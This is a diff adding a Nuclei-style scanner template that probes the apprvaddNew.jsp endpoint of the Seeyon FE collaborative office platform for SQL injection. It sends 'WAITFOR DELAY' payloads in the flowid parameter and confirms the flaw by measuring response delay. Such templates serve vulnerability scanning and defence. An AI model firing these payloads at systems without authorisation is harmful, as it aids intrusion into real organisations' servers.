@@ -1,0 +1,57 @@
+id: poc-yaml-seeyon-hulian-apprvaddnew-sqli
+info:
+  name: 致远互联FE协作办公平台apprvaddNew存在sql注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+variables:
+  t1: '{{rand_int(5,9)}}'
+  t2: '{{to_number(t1) + 2}}'
+  t3: '{{rand_int(1,4)}}'
+  t4: '{{to_number(t3) + 2}}'
+flow: |
+  http(1) && http(2) && http(3)
+http:
+  - id: "initial-check"
+    method: GET
+    path:
+      - "/witapprovemanage/apprvaddNew.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: "time-based-sqli-check-t1"
+    method: POST
+    path:
+      - "/witapprovemanage/apprvaddNew.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "flowid=1';WAITFOR+DELAY+'0:0:{{t1}}'--+---"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t1)"
+          - "duration <= to_number(t2)"
+
+  - id: "time-based-sqli-check-t3"
+    method: POST
+    path:
+      - "/witapprovemanage/apprvaddNew.jsp"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "flowid=1';WAITFOR+DELAY+'0:0:{{t3}}'--+---"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: dsl
+        dsl:
+          - "duration >= to_number(t3)"
+          - "duration <= to_number(t4)"
